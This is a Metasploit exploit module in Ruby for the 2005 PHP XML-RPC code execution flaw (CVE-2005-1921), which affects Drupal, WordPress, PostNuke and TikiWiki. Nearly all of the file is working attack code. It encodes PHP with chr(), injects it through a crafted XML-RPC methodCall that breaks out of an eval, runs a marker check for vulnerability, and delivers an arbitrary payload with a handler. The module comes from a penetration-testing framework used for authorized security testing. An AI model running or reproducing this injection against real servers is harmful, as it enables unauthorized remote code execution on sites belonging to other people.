##
# $Id: php_xmlrpc_eval.rb 9929 2010-07-25 21:37:54Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient

	# XXX This module needs an overhaul
	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'PHP XML-RPC Arbitrary Code Execution',
			'Description'    => %q{
				This module exploits an arbitrary code execution flaw
				discovered in many implementations of the PHP XML-RPC module.
				This flaw is exploitable through a number of PHP web
				applications, including but not limited to Drupal, Wordpress,
				Postnuke, and TikiWiki.
			},
			'Author'         => [ 
								'hdm', 
								'cazz', 
								'James Bercegay ( http://www.gulftech.org/ )'
								# June 05, 2011
								# - Added ARCH_PHP compatibility
								# - Cleaned up , and commented code in order to help aid 
								#   future development.
								# - Added original advisory reference
								# - One small line change to comply with msftidy
								],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9929 $',
			'References'     =>
				[
					['CVE', '2005-1921'],
					['OSVDB', '17793'],
					['BID', '14088'],
					['http://www.gulftech.org/advisories/81'],
				],
			'Privileged'     => false,
			'Platform'       => 'php',
			'Arch'           =>  ARCH_PHP,
			'Payload'        => {
					'Space' => 512,
					'DisableNops' => true,
				},
			'Targets'        => [ ['Automatic', { }], ],
			'DefaultTarget' => 0,
			'DisclosureDate' => 'Jun 29 2005'
			))


		register_options(
			[
				OptString.new('PATH', [ true,  "Path to xmlrpc.php", '/xmlrpc.php']),
				
				# Maximum size of randomly generated strings used
				OptInt.new('RLIM', [false, 'Random string limit'  ,  8 ]),
				
				# Very verbose output?
				OptBool.new('DBUG', [false, 'Verbose output? (Debug)'      ,  nil ]),
				
				
			], self.class)

		deregister_options(
			'HTTP::junk_params', # not your typical POST, so don't inject params.
			'HTTP::junk_slashes' # Disable junk_slashes due to reliability issues.
			)
	end
	
	# Debugging output
	def init_debug(resp, exit = 0)
	
		# is DBUG set? Check it
		if ( datastore['DBUG'] )
		
			# Print debugging data
			print_status("######### DEBUG! ########")
			pp resp
			print_status("#########################")

		end
		
		# Continue execution
		if ( exit.to_i > 0 )
		
			# Exit
			exit(0)
		end
	end
	
	# Generic post function
	def http_post(url, data, headers = {}, timeout = 15)
	
		# Protocol
		proto = datastore['SSL'] ? 'https': 'http' 
	
		# Determine request url
		url = url.length ? url: ''
		
		# Determine User-Agent
		headers['User-Agent'] = headers['User-Agent']  ? 
		headers['User-Agent'] : datastore['AGNT']
		
		# Determine Content-Type
		headers['Content-Type'] = headers['Content-Type'] ? 
		headers['Content-Type'] : "application/x-www-form-urlencoded"
		
		# Determine Content-Length
		headers['Content-Length'] = data.length
		
		# Determine Referer
		headers['Referer'] = headers['Referer']        ? 
		headers['Referer'] : "#{proto}://#{datastore['RHOST']}#{datastore['WDIR']}"

		# Delete all the null headers
		headers.each do | hkey, hval |
		
			# Null value
			if ( !hval )
			
				# Delete header key
				headers.delete(hkey)
			end
		end

		# Send request
		resp = send_request_raw(
		{
			'uri'     =>  url,
			'method'  => 'POST',
			'data'    => data,
			'headers' => headers
		}, 
		timeout	)
				
		# Returned
		return resp
	end
	
	# PHP chr encoding
	def get_php_chr(data)
		
		# Encode the data
		data = data.unpack("C*").collect{|x| "chr(#{x})"}.join(".")
		
		# Returned
		return data
	end
	
	# Code Execution	
	def exec_php(code)
	
		# PHP chr() encode data
		code = get_php_chr(code)
		
		# Random string
		rand = rand_text_alphanumeric(datastore['RLIM'])
		
		# Simple PHP wrapper
		wrap = "eval(#{code});exit;"
		
		# PHPXMLRPC request template
		tmpl = <<-TMPL.gsub(/^	{2}/, '')
		<?xml version="1.0"?>
		<methodCall>
		<methodName>#{rand}.#{rand}</methodName>
			<params>
				<param>
				<value><name>'));#{wrap}#</name></value> 
				</param>
			</params>
		</methodCall>
		TMPL
		
		# Make the request
		resp = http_post(datastore['PATH'], tmpl, { "Content-Type" => "text/xml" })
		
		# Return the response
		return ( resp && resp.body ) ? resp.body: nil
	end
	
	def check
		
		# Random string
		rand = rand_text_alphanumeric(datastore['RLIM'])
		
		# Is code execution possible?
		resp = exec_php("printf(#{get_php_chr(rand)});")
		
		# Check for the returned marker data
		if ( resp && resp =~ /#{rand}/ )
		
			# Vulnerable
			return Exploit::CheckCode::Vulnerable
		else
		
			# NOT vulnerable
			init_debug(resp)
			return Exploit::CheckCode::Safe
		end
	end

	def exploit
	
		# Verbose
		print_status("Attempting to execute the selected payload")
	
		# Execute payload
		init_debug(exec_php(payload.encoded))
		handler
	end
end